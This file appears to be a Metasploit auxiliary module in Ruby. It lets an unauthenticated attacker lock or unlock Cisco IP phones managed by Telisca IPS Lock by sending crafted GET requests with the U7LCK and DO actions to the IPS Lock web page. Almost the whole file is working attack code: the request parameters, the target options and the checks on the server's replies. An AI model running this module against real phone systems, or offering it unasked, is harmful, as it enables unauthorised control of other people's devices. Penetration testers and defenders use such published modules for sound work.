##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Telisca IPS Lock Cisco IP Phone Control',
        'Description' => %q{
          This module allows an unauthenticated attacker to exercise the
          "Lock" and "Unlock" functionality of Telisca IPS Lock for Cisco IP
          Phones. This module should be run in the VoIP VLAN, and requires
          knowledge of the target phone's name (for example, SEP002497AB1D4B).

          Set ACTION to either LOCK or UNLOCK. UNLOCK is the default.
        },
        'References' => [
          # Publicly disclosed via Metasploit PR
          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/6470'],
        ],
        'Author' => [
          'Fakhir Karim Reda <karim.fakhir[at]gmail.com>',
          'zirsalem'
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2015-12-17',
        'Actions' => [
          ['LOCK', { 'Description' => 'To lock a phone' }],
          ['UNLOCK', { 'Description' => 'To unlock a phone' }]
        ],
        'DefaultAction' => 'UNLOCK',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptAddress.new('RHOST', [true, 'The IPS Lock IP Address']),
        OptString.new('PHONENAME', [true, 'The name of the target phone'])
      ]
    )
  end

  def print_status(msg = '')
    super("#{peer} - #{msg}")
  end

  def print_good(msg = '')
    super("#{peer} - #{msg}")
  end

  def print_error(msg = '')
    super("#{peer} - #{msg}")
  end

  # Returns the status of the listening port.
  #
  # @return [Boolean] TrueClass if port open, otherwise FalseClass.
  def port_open?
    res = send_request_raw({ 'method' => 'GET', 'uri' => '/' })
    res ? true : false
  rescue ::Rex::ConnectionRefused
    vprint_status('Connection refused')
    return false
  rescue ::Rex::ConnectionError
    vprint_error('Connection failed')
    return false
  rescue ::OpenSSL::SSL::SSLError
    vprint_error('SSL/TLS connection error')
    return false
  end

  # Locks a device.
  #
  # @param phone_name [String] Name of the phone used for the pn parameter.
  #
  # @return [void]
  def lock(phone_name)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => '/IPSPCFG/user/Default.aspx',
      'headers' => {
        'Connection' => 'keep-alive',
        'Accept-Language' => 'en-US,en;q=0.5'
      },
      'vars_get' => {
        'action' => 'DO',
        'tg' => 'L',
        'pn' => phone_name,
        'dp' => '',
        'gr' => '',
        'gl' => ''
      }
    })

    unless res
      print_error('The connection timed out while trying to unlock')
      return
    end

    unless res.code == 200
      print_error("Unexpected response #{res.code}")
      return
    end

    if res.body.include?('Unlock') || res.body.include?('U7LCK')
      print_good("The device #{phone_name} is already locked")
    elsif res.body.include?('unlocked') || res.body.include?('Locking') || res.body.include?('QUIT')
      print_good("Device #{phone_name} successfully locked")
    else
      print_error('Unexpected reply')
    end
  end

  # Unlocks a phone.
  #
  # @param phone_name [String] Name of the phone used for the pn parameter.
  #
  # @return [void]
  def unlock(phone_name)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => '/IPSPCFG/user/Default.aspx',
      'headers' => {
        'Connection' => 'keep-alive',
        'Accept-Language' => 'en-US,en;q=0.5'
      },
      'vars_get' => {
        'action' => 'U7LCK',
        'pn' => phone_name,
        'dp' => ''
      }
    })

    unless res
      print_error('The connection timed out while trying to unlock')
      return
    end

    unless res.code == 200
      print_error("Unexpected response #{res.code}")
      return
    end

    if res.body.include?('Unlock') || res.body.include?('U7LCK')
      print_good("The device #{phone_name} is already locked")
    elsif res.body.include?('unlocked') || res.body.include?('QUIT')
      print_good("The device #{phone_name} successfully unlocked")
    else
      print_error('Unexpected reply')
    end
  end

  def run
    unless port_open?
      print_error('The web server is unreachable!')
      return
    end

    phone_name = datastore['PHONENAME']
    case action.name
    when 'LOCK'
      lock(phone_name)
    when 'UNLOCK'
      unlock(phone_name)
    end
  end
end
